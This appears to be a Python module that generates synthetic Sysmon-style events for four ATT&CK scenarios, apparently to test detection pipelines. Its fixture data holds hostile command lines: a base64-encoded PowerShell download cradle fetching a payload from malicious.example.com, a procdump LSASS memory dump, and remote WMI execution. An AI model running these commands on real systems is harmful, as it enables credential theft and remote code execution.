"""
Attack scenario generator.

Setiap scenario menghasilkan list[Event] deterministic yang
mensimulasikan attack lifecycle dari MITRE ATT&CK.

Scenario yang tersedia:
- shimming           : Application Shimming (T1546.011)
- powershell_cradle  : PowerShell download cradle (T1059.001 + T1105)
- credential_dump    : LSASS credential dumping (T1003.001)
- lateral_movement   : SMB/WMI lateral movement (T1021.002 + T1047)
"""

from __future__ import annotations

from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from typing import Callable

from pkg.models.event import (
    DnsContext,
    Event,
    EventCategory,
    EventSource,
    FileContext,
    NetworkContext,
    Platform,
    ProcessContext,
    RegistryContext,
    SourceReliability,
)


# ===========================================================================
# AttackScenario
# ===========================================================================

@dataclass(frozen=True)
class AttackScenario:
    """
    Deskripsi satu scenario.
    """
    name: str
    title: str
    description: str
    mitre_techniques: tuple[str, ...]
    category: str
    priority: str = "high"
    builder: Callable[[datetime], list[Event]] = field(
        default=lambda t: [],
    )

    @property
    def event_count_hint(self) -> str:
        return "multi-event"


# ===========================================================================
# Helpers
# ===========================================================================

BASE_TIME = datetime(2026, 9, 26, 10, 0, 0, tzinfo=timezone.utc)


def _event(
    *,
    event_id: str,
    offset_seconds: int,
    source: EventSource = EventSource.SYSMON,
    platform: Platform = Platform.WINDOWS,
    category: EventCategory,
    event_type: str,
    severity: int,
    host: str,
    user: str,
    process: ProcessContext | None = None,
    network: NetworkContext | None = None,
    file: FileContext | None = None,
    registry: RegistryContext | None = None,
    dns: DnsContext | None = None,
    rule_id: str | None = None,
    rule_name: str | None = None,
    mitre_techniques: list[str] | None = None,
    tags: list[str] | None = None,
) -> Event:
    return Event(
        event_id=event_id,
        timestamp=BASE_TIME + timedelta(seconds=offset_seconds),
        source=source,
        source_reliability=SourceReliability.A,
        platform=platform,
        category=category,
        event_type=event_type,
        severity=severity,
        host=host,
        user=user,
        process=process,
        network=network,
        file=file,
        registry=registry,
        dns=dns,
        rule_id=rule_id,
        rule_name=rule_name,
        mitre_techniques=mitre_techniques or [],
        tags=tags or [],
    )


# ===========================================================================
# Scenario 1: Application Shimming
# ===========================================================================

def _scenario_shimming(base: datetime) -> list[Event]:
    """
    ATT&CK: T1546.011 - Application Shimming.
    """
    events: list[Event] = []

    events.append(_event(
        event_id="SHIM-1",
        offset_seconds=0,
        category=EventCategory.PROCESS,
        event_type="process_creation",
        severity=85,
        host="WIN-01",
        user="SYSTEM",
        process=ProcessContext(
            name="sdbinst.exe",
            pid=4821,
            parent_name="svchost.exe",
            parent_pid=812,
            command_line="sdbinst.exe -m -bg",
            image_path="C:\\Windows\\System32\\sdbinst.exe",
        ),
        rule_id="92058",
        rule_name="Application Shimming detected",
        mitre_techniques=["T1546.011"],
        tags=["sysmon", "shim"],
    ))

    events.append(_event(
        event_id="SHIM-2",
        offset_seconds=15,
        category=EventCategory.REGISTRY,
        event_type="registry_set_value",
        severity=80,
        host="WIN-01",
        user="SYSTEM",
        registry=RegistryContext(
            key=(
                "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\"
                "CurrentVersion\\AppCompatFlags\\Custom"
            ),
            value_name="payload.exe",
            value_data="C:\\temp\\payload.exe",
            operation="create",
            is_persistence_key=True,
        ),
        rule_id="92059",
        rule_name="Shim database modification",
        mitre_techniques=["T1546.011"],
        tags=["registry", "persistence"],
    ))

    events.append(_event(
        event_id="SHIM-3",
        offset_seconds=30,
        category=EventCategory.FILE,
        event_type="file_created",
        severity=70,
        host="WIN-01",
        user="SYSTEM",
        file=FileContext(
            path="C:\\Windows\\System32\\sdbinst.exe",
            name="sdbinst.exe",
            hashes={"sha256": "deadbeef" * 8},
            operation="create",
        ),
        rule_id="92060",
        rule_name="Shim database file created",
        mitre_techniques=["T1546.011"],
        tags=["file"],
    ))

    return events


# ===========================================================================
# Scenario 2: PowerShell Download Cradle
# ===========================================================================

def _scenario_powershell_cradle(base: datetime) -> list[Event]:
    """
    ATT&CK: T1059.001 (PowerShell) + T1105 (Ingress Tool Transfer).
    """
    events: list[Event] = []

    events.append(_event(
        event_id="PSC-1",
        offset_seconds=0,
        category=EventCategory.PROCESS,
        event_type="process_creation",
        severity=75,
        host="WIN-02",
        user="CORP\\user1",
        process=ProcessContext(
            name="powershell.exe",
            pid=3120,
            parent_name="winword.exe",
            parent_pid=2900,
            command_line=(
                "powershell.exe -nop -w hidden -enc "
                "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA"
                "TgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4A"
                "RABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgA"
                "JwBoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8A"
                "dQBzAC4AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8A"
                "cABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
            ),
            image_path=(
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\"
                "powershell.exe"
            ),
        ),
        rule_id="4104",
        rule_name="Suspicious PowerShell execution",
        mitre_techniques=["T1059.001"],
        tags=["powershell", "cradle"],
    ))

    events.append(_event(
        event_id="PSC-2",
        offset_seconds=5,
        category=EventCategory.DNS,
        event_type="dns_query",
        severity=60,
        host="WIN-02",
        user="CORP\\user1",
        process=ProcessContext(
            name="powershell.exe",
            pid=3120,
        ),
        dns=DnsContext(
            query="malicious.example.com",
            query_type="A",
            response=["203.0.113.42"],
        ),
        rule_id="4105",
        rule_name="Suspicious DNS query by PowerShell",
        mitre_techniques=["T1059.001", "T1071.004"],
        tags=["dns"],
    ))

    events.append(_event(
        event_id="PSC-3",
        offset_seconds=8,
        category=EventCategory.NETWORK,
        event_type="network_connection",
        severity=80,
        host="WIN-02",
        user="CORP\\user1",
        process=ProcessContext(
            name="powershell.exe",
            pid=3120,
        ),
        network=NetworkContext(
            source_ip="10.10.10.15",
            destination_ip="203.0.113.42",
            destination_port=443,
            protocol="TCP",
        ),
        rule_id="4106",
        rule_name="PowerShell outbound connection",
        mitre_techniques=["T1105", "T1071"],
        tags=["c2"],
    ))

    events.append(_event(
        event_id="PSC-4",
        offset_seconds=12,
        category=EventCategory.FILE,
        event_type="file_created",
        severity=75,
        host="WIN-02",
        user="CORP\\user1",
        process=ProcessContext(
            name="powershell.exe",
            pid=3120,
        ),
        file=FileContext(
            path="C:\\Users\\user1\\AppData\\Local\\Temp\\payload.ps1",
            name="payload.ps1",
            operation="create",
        ),
        rule_id="4107",
        rule_name="PowerShell dropped payload",
        mitre_techniques=["T1105"],
        tags=["dropper"],
    ))

    events.append(_event(
        event_id="PSC-5",
        offset_seconds=15,
        category=EventCategory.PROCESS,
        event_type="process_creation",
        severity=85,
        host="WIN-02",
        user="CORP\\user1",
        process=ProcessContext(
            name="payload.ps1",
            pid=4120,
            parent_name="powershell.exe",
            parent_pid=3120,
            command_line="payload.ps1",
        ),
        rule_id="4108",
        rule_name="Payload execution",
        mitre_techniques=["T1059.001"],
        tags=["execution"],
    ))

    return events


# ===========================================================================
# Scenario 3: Credential Dumping
# ===========================================================================

def _scenario_credential_dump(base: datetime) -> list[Event]:
    """
    ATT&CK: T1003.001 - LSASS Memory credential dumping.
    """
    events: list[Event] = []

    events.append(_event(
        event_id="CD-1",
        offset_seconds=0,
        category=EventCategory.PROCESS,
        event_type="process_creation",
        severity=80,
        host="WIN-03",
        user="NT AUTHORITY\\SYSTEM",
        process=ProcessContext(
            name="procdump.exe",
            pid=5120,
            parent_name="cmd.exe",
            parent_pid=4900,
            command_line=(
                "procdump.exe -accepteula -ma lsass.exe "
                "C:\\Windows\\Temp\\lsass.dmp"
            ),
            image_path="C:\\Tools\\procdump.exe",
        ),
        rule_id="1010",
        rule_name="Credential dumping tool detected",
        mitre_techniques=["T1003.001"],
        tags=["credential_access"],
    ))

    events.append(_event(
        event_id="CD-2",
        offset_seconds=10,
        category=EventCategory.PROCESS,
        event_type="process_access",
        severity=90,
        host="WIN-03",
        user="NT AUTHORITY\\SYSTEM",
        process=ProcessContext(
            name="lsass.exe",
            pid=700,
            parent_name="wininit.exe",
            parent_pid=520,
        ),
        rule_id="1011",
        rule_name="LSASS memory access",
        mitre_techniques=["T1003.001"],
        tags=["lsass", "high_confidence"],
    ))

    events.append(_event(
        event_id="CD-3",
        offset_seconds=15,
        category=EventCategory.FILE,
        event_type="file_created",
        severity=85,
        host="WIN-03",
        user="NT AUTHORITY\\SYSTEM",
        file=FileContext(
            path="C:\\Windows\\Temp\\lsass.dmp",
            name="lsass.dmp",
            size=45_000_000,
            operation="create",
        ),
        rule_id="1012",
        rule_name="LSASS dump file created",
        mitre_techniques=["T1003.001"],
        tags=["credential_dump"],
    ))

    return events


# ===========================================================================
# Scenario 4: Lateral Movement
# ===========================================================================

def _scenario_lateral_movement(base: datetime) -> list[Event]:
    """
    ATT&CK: T1021.002 (SMB) + T1047 (WMI).
    """
    events: list[Event] = []

    events.append(_event(
        event_id="LM-1",
        offset_seconds=0,
        category=EventCategory.PROCESS,
        event_type="process_creation",
        severity=70,
        host="WIN-04",
        user="CORP\\svc_backup",
        process=ProcessContext(
            name="wmic.exe",
            pid=6200,
            parent_name="cmd.exe",
            parent_pid=6100,
            command_line=(
                "wmic /node:WIN-05 process call create "
                "\"cmd.exe /c whoami > C:\\temp\\out.txt\""
            ),
        ),
        rule_id="1030",
        rule_name="Remote WMI execution",
        mitre_techniques=["T1047"],
        tags=["lateral_movement"],
    ))

    events.append(_event(
        event_id="LM-2",
        offset_seconds=10,
        category=EventCategory.NETWORK,
        event_type="network_connection",
        severity=75,
        host="WIN-04",
        user="CORP\\svc_backup",
        process=ProcessContext(
            name="wmic.exe",
            pid=6200,
        ),
        network=NetworkContext(
            source_ip="10.10.10.20",
            destination_ip="10.10.10.21",
            destination_port=445,
            protocol="TCP",
        ),
        rule_id="1031",
        rule_name="SMB connection to remote host",
        mitre_techniques=["T1021.002"],
        tags=["smb"],
    ))

    events.append(_event(
        event_id="LM-3",
        offset_seconds=15,
        category=EventCategory.PROCESS,
        event_type="process_creation",
        severity=80,
        host="WIN-05",
        user="CORP\\svc_backup",
        process=ProcessContext(
            name="cmd.exe",
            pid=7200,
            parent_name="wmiprvse.exe",
            parent_pid=7100,
            command_line="cmd.exe /c whoami > C:\\temp\\out.txt",
        ),
        rule_id="1032",
        rule_name="Remote process executed via WMI",
        mitre_techniques=["T1047"],
        tags=["remote_exec"],
    ))

    events.append(_event(
        event_id="LM-4",
        offset_seconds=25,
        category=EventCategory.AUTHENTICATION,
        event_type="logon_success",
        severity=60,
        host="WIN-05",
        user="CORP\\svc_backup",
        rule_id="4624",
        rule_name="Successful logon (type 3 - network)",
        mitre_techniques=["T1078"],
        tags=["logon"],
    ))

    return events


# ===========================================================================
# Registry
# ===========================================================================

ATTACK_SCENARIOS: dict[str, AttackScenario] = {
    "shimming": AttackScenario(
        name="shimming",
        title="Application Shimming persistence",
        description=(
            "Simulasi persistence via Windows shim database. "
            "sdbinst.exe dijalankan oleh svchost.exe, diikuti "
            "modifikasi registry AppCompatFlags dan drop file shim."
        ),
        mitre_techniques=("T1546.011",),
        category="persistence",
        priority="critical",
        builder=_scenario_shimming,
    ),
    "powershell_cradle": AttackScenario(
        name="powershell_cradle",
        title="PowerShell download cradle",
        description=(
            "Simulasi execution via PowerShell yang encoded, "
            "download payload dari domain eksternal, drop file, "
            "dan eksekusi lanjutan."
        ),
        mitre_techniques=("T1059.001", "T1105", "T1071"),
        category="execution",
        priority="high",
        builder=_scenario_powershell_cradle,
    ),
    "credential_dump": AttackScenario(
        name="credential_dump",
        title="LSASS credential dumping",
        description=(
            "Simulasi credential access via procdump.exe yang "
            "mengakses memory lsass.exe dan membuat dump file."
        ),
        mitre_techniques=("T1003.001",),
        category="credential_access",
        priority="critical",
        builder=_scenario_credential_dump,
    ),
    "lateral_movement": AttackScenario(
        name="lateral_movement",
        title="Lateral movement via WMI/SMB",
        description=(
            "Simulasi lateral movement dari WIN-04 ke WIN-05 "
            "via WMI remote execution dan SMB connection."
        ),
        mitre_techniques=("T1047", "T1021.002", "T1078"),
        category="lateral_movement",
        priority="high",
        builder=_scenario_lateral_movement,
    ),
}


# ===========================================================================
# Public API
# ===========================================================================

def list_scenarios() -> list[str]:
    """Return nama semua scenario, sorted."""
    return sorted(ATTACK_SCENARIOS.keys())


def build_scenario(name: str) -> list[Event]:
    """
    Bangun scenario by name.

    Raise KeyError kalau tidak ditemukan.
    """
    if name not in ATTACK_SCENARIOS:
        available = ", ".join(list_scenarios())
        raise KeyError(
            f"scenario {name!r} not found. "
            f"Available: {available}"
        )
    scenario = ATTACK_SCENARIOS[name]
    return scenario.builder(BASE_TIME)


def get_scenario(name: str) -> AttackScenario:
    """Ambil metadata scenario."""
    if name not in ATTACK_SCENARIOS:
        raise KeyError(f"scenario {name!r} not found")
    return ATTACK_SCENARIOS[name]


__all__ = [
    "AttackScenario",
    "ATTACK_SCENARIOS",
    "build_scenario",
    "get_scenario",
    "list_scenarios",
    "BASE_TIME",
]
